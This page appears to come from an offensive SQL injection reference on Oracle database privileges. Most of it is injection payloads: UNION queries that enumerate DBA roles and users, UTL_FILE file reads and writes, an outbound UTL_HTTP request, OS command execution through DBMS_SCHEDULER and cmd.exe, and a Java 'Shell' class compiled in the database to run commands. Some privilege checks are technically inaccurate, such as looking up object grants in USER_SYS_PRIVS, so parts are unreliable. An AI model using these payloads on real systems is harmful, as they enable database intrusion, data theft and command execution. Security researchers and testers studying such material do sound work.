---
title: Privileges
description: Analyzing and exploiting Oracle database privileges in SQL injection
category: Advanced Techniques
order: 12
tags: ["privileges", "escalation", "administration", "security"]
lastUpdated: 2025-03-15
---

## Privileges

Oracle implements a sophisticated privilege system to control access to database objects and functionality. Understanding and enumerating privileges is crucial for advanced SQL injection attacks, as they determine what actions can be performed within the database.

### Privilege Types in Oracle

Oracle has several types of privileges:

| Privilege Type | Description | Examples |
|----------------|-------------|----------|
| System Privileges | Control of database-wide actions | CREATE SESSION, CREATE TABLE, CREATE ANY TABLE |
| Object Privileges | Access to specific database objects | SELECT, INSERT, UPDATE, DELETE on tables |
| Role-Based Privileges | Collection of privileges assigned as a group | DBA, CONNECT, RESOURCE roles |
| Code-Based Privileges | Permission to execute procedures | EXECUTE on packages like UTL_FILE |

### Enumerating Current Privileges

```sql
-- Current user's privileges
SELECT * FROM USER_SYS_PRIVS

-- Current user's role privileges
SELECT * FROM USER_ROLE_PRIVS

-- Current user's granted roles
SELECT * FROM SESSION_ROLES

-- Current user's object privileges
SELECT * FROM USER_TAB_PRIVS
```

### SQL Injection Examples

#### Checking Admin Access

```sql
-- Check if current user has DBA role
' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_ROLE_PRIVS WHERE GRANTED_ROLE='DBA') THEN 'DBA ROLE FOUND' ELSE 'NO DBA' END, NULL FROM DUAL--

-- Check for system administrator privileges
' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='SYSDBA') THEN 'SYSDBA FOUND' ELSE 'NO SYSDBA' END, NULL FROM DUAL--
```

#### Enumerating All Users' Privileges

```sql
-- List all privileged users (requires elevated privileges)
' UNION SELECT USERNAME || ' - ' || PRIVILEGE, NULL FROM DBA_SYS_PRIVS--

-- Find users with admin privileges
' UNION SELECT USERNAME, NULL FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE='DBA'--
```

### Exploiting Powerful Privileges

#### File System Access

If UTL_FILE privilege is available:

```sql
-- Check for UTL_FILE privilege
' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='EXECUTE ANY PROCEDURE' OR PRIVILEGE='EXECUTE ON UTL_FILE') THEN 'UTL_FILE ACCESSIBLE' ELSE 'NO UTL_FILE' END, NULL FROM DUAL--

-- Read file
' UNION SELECT UTL_FILE.GET_LINE('DIRECTORY', 'file.txt',1), NULL FROM DUAL--

-- Write file
' BEGIN DECLARE FH UTL_FILE.FILE_TYPE; BEGIN FH := UTL_FILE.FOPEN('DIRECTORY', 'output.txt', 'w'); UTL_FILE.PUT_LINE(FH, 'content'); UTL_FILE.FCLOSE(FH); END; END;--
```

#### Network Access

If UTL_TCP, UTL_HTTP, or UTL_SMTP privileges are available:

```sql
-- Check for network access privileges
' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='EXECUTE ON UTL_HTTP') THEN 'UTL_HTTP ACCESSIBLE' ELSE 'NO UTL_HTTP' END, NULL FROM DUAL--

-- Make HTTP request
' UNION SELECT UTL_HTTP.REQUEST('http://example.com'), NULL FROM DUAL--
```

#### Command Execution

If DBMS_SCHEDULER privileges exist:

```sql
-- Check for DBMS_SCHEDULER privilege
' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='EXECUTE ON DBMS_SCHEDULER') THEN 'DBMS_SCHEDULER ACCESSIBLE' ELSE 'NO SCHEDULER' END, NULL FROM DUAL--

-- Execute OS command (Windows example)
' BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'CMD_JOB', job_type => 'EXECUTABLE', job_action => 'cmd.exe', number_of_arguments => 3, start_date => SYSDATE, enabled => FALSE, auto_drop => TRUE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB',1,'/c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB',2,'dir'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD_JOB',3,'> c:\temp\output.txt'); DBMS_SCHEDULER.ENABLE('CMD_JOB'); END;--
```

### Privilege Escalation

#### Finding PL/SQL Injection Points

```sql
-- Enumerate definer rights procedures
' UNION SELECT OWNER || '.' || OBJECT_NAME, OBJECT_TYPE FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('PROCEDURE', 'FUNCTION', 'PACKAGE') AND OWNER != 'SYS'--

-- Find vulnerable packages
' UNION SELECT TEXT, NULL FROM ALL_SOURCE WHERE TYPE='PACKAGE BODY' AND TEXT LIKE '%EXECUTE IMMEDIATE%'--
```

#### Exploiting Java in the Database

```sql
-- Check for Java privileges
' UNION SELECT CASE WHEN EXISTS (SELECT * FROM USER_SYS_PRIVS WHERE PRIVILEGE='CREATE PROCEDURE' OR PRIVILEGE='CREATE ANY PROCEDURE') THEN 'CAN CREATE JAVA' ELSE 'NO JAVA PRIV' END, NULL FROM DUAL--

-- Create and execute Java (example)
' BEGIN EXECUTE IMMEDIATE 'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Shell" AS import java.io.*; public class Shell { public static String execute(String cmd) throws Exception { BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream())); StringBuffer sb = new StringBuffer(); String line; while((line=br.readLine()) != null) sb.append(line).append("\n"); return sb.toString(); } }'; END;--
```

### Dictionary Views for Privilege Analysis

```sql
-- List available dictionary views
' UNION SELECT TABLE_NAME, COMMENTS FROM DICTIONARY WHERE TABLE_NAME LIKE '%PRIV%'--

-- Check specific privilege for current user
' UNION SELECT PRIVILEGE, 'YES' FROM USER_SYS_PRIVS WHERE PRIVILEGE='CREATE ANY TABLE'--
```

### Session Privileges

```sql
-- Check current session privileges
' UNION SELECT SYS_CONTEXT('USERENV', 'CURRENT_USER') || ' - ' || SYS_CONTEXT('USERENV', 'ISDBA'), NULL FROM DUAL--

-- List enabled roles
' UNION SELECT ROLE, NULL FROM SESSION_ROLES--
```

### Privilege-Restricted Functions

```sql
-- Test access to restricted functions
' UNION SELECT DBMS_STATS.GET_PARAM('STALE_PERCENT'), NULL FROM DUAL--

-- Test execute permissions on sys objects
' BEGIN SYS.KUPW$WORKER.MAIN('x','x','x','x'); END;--
```

### Mitigating Privilege Constraints

```sql
-- Find alternate accessible packages
' UNION SELECT DISTINCT OWNER || '.' || NAME, TYPE FROM ALL_SOURCE WHERE TYPE='PACKAGE' AND OWNER NOT IN ('SYS','SYSTEM','CTXSYS')--

-- Find indirect privilege paths
' UNION SELECT GRANTEE, PRIVILEGE FROM DBA_SYS_PRIVS WHERE GRANTEE IN (SELECT GRANTED_ROLE FROM USER_ROLE_PRIVS)--
```

